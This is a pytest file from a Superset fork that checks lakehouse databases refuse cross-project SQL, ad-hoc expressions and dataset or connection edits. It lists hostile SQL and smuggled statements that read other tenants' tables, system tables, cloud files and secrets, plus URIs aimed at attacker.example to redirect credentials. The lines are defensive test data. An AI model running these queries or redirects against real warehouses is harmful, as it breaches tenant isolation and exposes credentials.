# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
"""Dashboard isolation for external-lakehouse databases.

Every project entry PlaidCloud registers on a customer's Snowflake or Databricks
warehouse authenticates as one shared principal, so the fork refuses SQL and
dataset writes on them for every Superset role and keeps ad-hoc SQL to the
dataset's own row.
"""

from __future__ import annotations

from types import SimpleNamespace

import pytest
from flask import Flask
from pytest_mock import MockerFixture
from sqlalchemy.orm.session import Session

from superset import security_manager
from superset.commands.database.exceptions import DatabaseInvalidError
from superset.commands.database.importers.v1.utils import import_database
from superset.commands.database.test_connection import (
    TestConnectionDatabaseCommand as ConnectionCheckCommand,
)
from superset.commands.database.update import UpdateDatabaseCommand
from superset.commands.dataset.create import CreateDatasetCommand
from superset.commands.dataset.exceptions import (
    DatasetForbiddenError,
    DatasetInvalidError,
)
from superset.commands.dataset.update import UpdateDatasetCommand
from superset.connectors.sqla.models import SqlaTable, SqlMetric, TableColumn
from superset.databases.utils import is_external_lakehouse
from superset.errors import SupersetErrorType
from superset.exceptions import (
    QueryObjectValidationError,
    SupersetParseError,
    SupersetSecurityException,
)
from superset.models.core import Database
from superset.models.helpers import validate_adhoc_subquery
from superset.models.sql_lab import Query
from superset.sql.execution.executor import SQLExecutor
from superset.sql.parse import Table

MARKER = '{"plaid_external_lakehouse": true}'
REFUSED = "SQL Lab and dataset editing are not available on this warehouse"


def lakehouse_db(**kwargs) -> Database:
    return Database(
        **{
            "database_name": "Sales (abcd)",
            "sqlalchemy_uri": "sqlite://",
            "extra": MARKER,
            **kwargs,
        }
    )


@pytest.fixture
def human(mocker: MockerFixture, session: Session) -> None:
    """Any signed-in role: Admin, Alpha or sql_lab all hold database access."""
    mocker.patch.object(security_manager, "can_access_database", return_value=True)
    mocker.patch.object(
        security_manager, "can_manage_external_lakehouse", return_value=False
    )


@pytest.fixture
def automation(mocker: MockerFixture) -> None:
    mocker.patch.object(
        security_manager, "can_manage_external_lakehouse", return_value=True
    )


@pytest.mark.parametrize(
    ("extra", "expected"),
    [
        (MARKER, True),
        ('{"plaid_external_lakehouse": false}', False),
        ('{"plaid_external_lakehouse": "true"}', False),
        ("{}", False),
        (None, False),
    ],
)
def test_marker(extra, expected):
    database = Database(database_name="x", sqlalchemy_uri="sqlite://", extra=extra)

    assert is_external_lakehouse(database) is expected


def test_registration_forces_sql_lab_and_writes_off(session: Session, automation):
    Database.metadata.create_all(session.get_bind())
    flags = {
        "expose_in_sqllab": True,
        "allow_dml": True,
        "allow_file_upload": True,
        "allow_ctas": True,
        "allow_cvas": True,
    }
    lakehouse = lakehouse_db(**flags)
    internal = Database(database_name="internal", sqlalchemy_uri="sqlite://", **flags)
    session.add_all([lakehouse, internal])
    session.flush()

    assert [getattr(lakehouse, flag) for flag in flags] == [False] * 5
    assert [getattr(internal, flag) for flag in flags] == [True] * 5

    lakehouse.expose_in_sqllab = True
    session.flush()

    assert lakehouse.expose_in_sqllab is False


# Each statement reads past the one project's published tables through the shared
# principal: another project's table by qualified name, metadata, IDENTIFIER(),
# files, and the vendor's system tables.
NEGATIVE_SQL = [
    "SELECT * FROM other_db.other_schema.payroll",
    "SHOW TABLES IN ACCOUNT",
    "SELECT * FROM IDENTIFIER('other_db.other_schema.payroll')",
    "SELECT * FROM read_files('s3://bucket/path')",
    "SELECT * FROM snowflake.account_usage.query_history",
    "SELECT * FROM system.information_schema.tables",
]


@pytest.mark.parametrize("sql", NEGATIVE_SQL)
def test_sql_refused_for_every_role(human, sql):
    database = lakehouse_db()

    with pytest.raises(SupersetSecurityException) as excinfo:
        security_manager.raise_for_access(database=database, sql=sql)
    assert excinfo.value.error.error_type == (
        SupersetErrorType.DATABASE_SECURITY_ACCESS_ERROR
    )
    assert REFUSED in excinfo.value.error.message


@pytest.mark.parametrize(
    "kwargs",
    [
        pytest.param(
            lambda db: {"query": Query(database=db, sql=NEGATIVE_SQL[0])},
            id="sql-lab-execute",
        ),
        pytest.param(
            lambda db: {"database": db, "table": Table("payroll", "other_schema")},
            id="table-metadata",
        ),
        pytest.param(lambda db: {"database": db}, id="cost-estimate"),
    ],
)
def test_every_sql_entry_point_refused(human, kwargs):
    with pytest.raises(SupersetSecurityException, match=REFUSED):
        security_manager.raise_for_access(**kwargs(lakehouse_db()))


def test_sql_still_allowed_on_internal_lakehouse(human):
    internal = Database(database_name="internal", sqlalchemy_uri="sqlite://")

    security_manager.raise_for_access(database=internal, sql="SELECT 1")


def test_automation_keeps_table_metadata(automation, mocker: MockerFixture):
    mocker.patch.object(security_manager, "can_access_database", return_value=True)

    security_manager.raise_for_access(
        database=lakehouse_db(), table=Table("orders", "project_schema")
    )


def test_database_execute_refused(human, session: Session):
    Database.metadata.create_all(session.get_bind())  # RLS lookup runs first

    result = SQLExecutor(lakehouse_db()).execute(NEGATIVE_SQL[0])

    assert result.status.value == "failed"
    assert REFUSED in result.error_message


def test_schema_and_table_listing_empty(human):
    database = lakehouse_db()

    assert security_manager.get_catalogs_accessible_by_user(database, {"a"}) == set()
    assert (
        security_manager.get_schemas_accessible_by_user(database, None, {"a", "b"})
        == set()
    )
    assert security_manager.get_datasources_accessible_by_user(database, []) == []


# Ad-hoc SQL as a chart sends it: columns and metrics as `SELECT <expr>`, filters
# as `extras.where`/`having` (also `SELECT <expr>`), sort as `ORDER BY <expr>`.
NEGATIVE_ADHOC = [
    "other_db.other_schema.payroll.salary",
    "payroll.salary",
    "IDENTIFIER('other_db.other_schema.payroll')",
    "read_files('s3://bucket/path')",
    "(SELECT MAX(salary) FROM other_schema.payroll)",
    "amount IN (SELECT amount FROM snowflake.account_usage.query_history)",
    "EXISTS (SELECT 1 FROM information_schema.tables)",
    "read_csv('s3://bucket/path')",
    "secret('scope', 'key')",
    ":bind",
]


@pytest.mark.parametrize("engine", ["snowflake", "databricks"])
@pytest.mark.parametrize("wrap", ["SELECT {}", "SELECT 1 ORDER BY {}"])
@pytest.mark.parametrize("expression", NEGATIVE_ADHOC)
def test_adhoc_sql_refused(engine, wrap, expression):
    with pytest.raises(SupersetSecurityException) as excinfo:
        validate_adhoc_subquery(
            wrap.format(expression), lakehouse_db(), None, "project_schema", engine
        )
    assert excinfo.value.error.error_type == (
        SupersetErrorType.ADHOC_SUBQUERY_NOT_ALLOWED_ERROR
    )


@pytest.mark.parametrize("engine", ["snowflake", "databricks"])
def test_adhoc_show_never_runs(engine):
    with pytest.raises((SupersetSecurityException, SupersetParseError)):
        validate_adhoc_subquery(
            "SELECT 1; SHOW TABLES", lakehouse_db(), None, "project_schema", engine
        )


# What PlaidCloud's generated charts and ordinary Explore use must keep working.
ROW_ADHOC = [
    "COUNT(*)",
    "CONCAT('US-', entity)",
    "SUM(amount) / NULLIF(COUNT(DISTINCT id), 0)",
    "CASE WHEN region = 'US' THEN 1 ELSE 0 END",
    "region = 'US' AND amount > 5",
    "DATE_TRUNC('month', ts)",
    "COALESCE(amount, 0)",
]


@pytest.mark.parametrize("engine", ["snowflake", "databricks"])
@pytest.mark.parametrize("expression", ROW_ADHOC)
def test_row_adhoc_sql_allowed(engine, expression):
    sql = f"SELECT {expression}"

    assert validate_adhoc_subquery(sql, lakehouse_db(), None, "s", engine) == sql


def test_adhoc_check_scoped_to_external_lakehouse():
    internal = Database(database_name="internal", sqlalchemy_uri="sqlite://")
    sql = "SELECT IDENTIFIER('other.t')"

    assert validate_adhoc_subquery(sql, internal, None, "s", "snowflake") == sql


def published_dataset(database: Database) -> SqlaTable:
    return SqlaTable(
        table_name="orders",
        database=database,
        columns=[
            TableColumn(column_name="region", type="TEXT"),
            TableColumn(column_name="amount", type="INTEGER"),
        ],
        metrics=[SqlMetric(metric_name="count", expression="COUNT(*)")],
    )


@pytest.fixture
def chart_query(mocker: MockerFixture, app: Flask):
    mocker.patch(
        "superset.connectors.sqla.models.security_manager.get_guest_rls_filters",
        return_value=[],
    )
    mocker.patch(
        "superset.connectors.sqla.models.security_manager.is_guest_user",
        return_value=False,
    )

    def run(**query_obj) -> str:
        dataset = published_dataset(lakehouse_db(id=1))
        with app.test_request_context():
            return dataset.get_query_str_extended(
                {"is_timeseries": False, "metrics": [], "columns": [], **query_obj},
                mutate=False,
            ).sql

    return run


def test_chart_on_published_dataset_renders(chart_query):
    sql = chart_query(
        metrics=[
            "count",
            {
                "expressionType": "SIMPLE",
                "column": {"column_name": "amount"},
                "aggregate": "SUM",
                "label": "total",
            },
            {"expressionType": "SQL", "sqlExpression": "COUNT(*)", "label": "rows"},
        ],
        columns=[
            "region",
            {"sqlExpression": "CONCAT('US-', region)", "label": "entity"},
        ],
        filter=[{"col": "region", "op": "IN", "val": ["US"]}],
        extras={"where": "amount > 5"},
    )

    assert "FROM orders" in sql
    assert "'US-' || region AS entity" in sql


@pytest.mark.parametrize(
    "query_obj",
    [
        pytest.param(
            {"columns": [{"sqlExpression": "payroll.salary", "label": "x"}]},
            id="adhoc-column",
        ),
        pytest.param(
            {
                "metrics": [
                    {
                        "expressionType": "SQL",
                        "sqlExpression": "MAX(other_schema.payroll.salary)",
                        "label": "m",
                    }
                ]
            },
            id="adhoc-metric",
        ),
        pytest.param(
            {
                "metrics": ["count"],
                "extras": {"where": "IDENTIFIER('other.t') IS NOT NULL"},
            },
            id="adhoc-filter-where",
        ),
        pytest.param(
            {
                "metrics": ["count"],
                "groupby": ["region"],
                "extras": {"having": "COUNT(*) > (SELECT COUNT(*) FROM other.t)"},
            },
            id="adhoc-filter-having",
        ),
        pytest.param(
            {
                "metrics": ["count"],
                "filter": [
                    {
                        "col": {"sqlExpression": "read_files('s3://x')", "label": "f"},
                        "op": "IS NOT NULL",
                    }
                ],
            },
            id="adhoc-filter-column",
        ),
    ],
)
def test_chart_adhoc_sql_refused(chart_query, query_obj):
    with pytest.raises(
        (SupersetSecurityException, QueryObjectValidationError),
        match="Custom SQL on this warehouse",
    ):
        chart_query(**query_obj)


def test_dataset_create_refused(human, mocker: MockerFixture):
    mocker.patch(
        "superset.commands.dataset.create.DatasetDAO.get_database_by_id",
        return_value=lakehouse_db(),
    )
    mocker.patch(
        "superset.commands.dataset.create.DatasetDAO.validate_uniqueness",
        return_value=True,
    )
    mocker.patch(
        "superset.commands.dataset.create.DatasetDAO.validate_table_exists",
        return_value=True,
    )
    mocker.patch.object(CreateDatasetCommand, "populate_owners", return_value=[])

    with pytest.raises(DatasetInvalidError) as excinfo:
        CreateDatasetCommand({"database": 1, "table_name": "payroll"}).validate()
    assert REFUSED in str(excinfo.value.normalized_messages())


def test_dataset_update_refused(human, mocker: MockerFixture):
    mocker.patch(
        "superset.commands.dataset.update.DatasetDAO.find_by_id",
        return_value=SimpleNamespace(database=lakehouse_db(), owners=[]),
    )
    mocker.patch.object(security_manager, "raise_for_ownership")

    with pytest.raises(DatasetForbiddenError):
        UpdateDatasetCommand(1, {"sql": "SELECT * FROM other.payroll"}).validate()


def test_orm_refuses_dataset_writes_from_any_path(
    session: Session, mocker: MockerFixture
):
    SqlaTable.metadata.create_all(session.get_bind())
    manage = mocker.patch.object(
        security_manager, "can_manage_external_lakehouse", return_value=True
    )
    dataset = published_dataset(lakehouse_db())
    session.add(dataset)
    session.flush()  # PlaidCloud's automation publishes the dataset

    manage.return_value = False
    dataset.columns[0].expression = "(SELECT salary FROM other.payroll)"
    with pytest.raises(SupersetSecurityException, match=REFUSED):
        session.flush()
    session.rollback()

    session.add(published_dataset(lakehouse_db(database_name="Other (efgh)")))
    with pytest.raises(SupersetSecurityException, match=REFUSED):
        session.flush()


def test_orm_allows_internal_datasets(session: Session, human):
    SqlaTable.metadata.create_all(session.get_bind())
    internal = Database(database_name="internal", sqlalchemy_uri="sqlite://")
    session.add(published_dataset(internal))
    session.flush()


def test_database_edit_refused(human, mocker: MockerFixture):
    mocker.patch(
        "superset.commands.database.update.DatabaseDAO.find_by_id",
        return_value=lakehouse_db(),
    )

    with pytest.raises(DatabaseInvalidError) as excinfo:
        UpdateDatabaseCommand(
            1, {"sqlalchemy_uri": "snowflake://u:XXXXXXXXXX@attacker.example/db"}
        ).run()
    assert REFUSED in str(excinfo.value.normalized_messages())


def test_test_connection_never_lends_lakehouse_credentials(
    human, mocker: MockerFixture
):
    database = lakehouse_db()
    mocker.patch(
        "superset.commands.database.test_connection.DatabaseDAO.get_database_by_name",
        return_value=database,
    )

    command = ConnectionCheckCommand(
        {
            "database_name": database.database_name,
            "sqlalchemy_uri": "snowflake://u:XXXXXXXXXX@attacker.example/db",
        }
    )

    assert command._model is None


def test_import_never_overwrites_lakehouse(human, mocker: MockerFixture):
    existing = lakehouse_db()
    query = mocker.patch("superset.commands.database.importers.v1.utils.db")
    query.session.query.return_value.filter_by.return_value.first.return_value = (
        existing
    )

    result = import_database(
        {"uuid": "1", "sqlalchemy_uri": "snowflake://attacker.example/db"},
        overwrite=True,
        ignore_permissions=True,
    )

    assert result is existing


def test_stock_superset_refuses_everyone():
    assert security_manager.can_manage_external_lakehouse() is False


@pytest.mark.parametrize(
    ("automation_principal", "expected"), [(True, True), (False, False)]
)
def test_plaid_exempts_only_automation(
    mocker: MockerFixture, app: Flask, automation_principal, expected
):
    pytest.importorskip("plaidcloud.rpc")
    from plaid.security import PlaidSecurityManager

    sm = PlaidSecurityManager.__new__(PlaidSecurityManager)
    mocker.patch(
        "plaid.rls_guard.is_automation_principal", return_value=automation_principal
    )

    with app.test_request_context():
        assert sm.can_manage_external_lakehouse() is expected
    # Celery (alerts, async imports) has no request to identify.
    assert sm.can_manage_external_lakehouse() is False
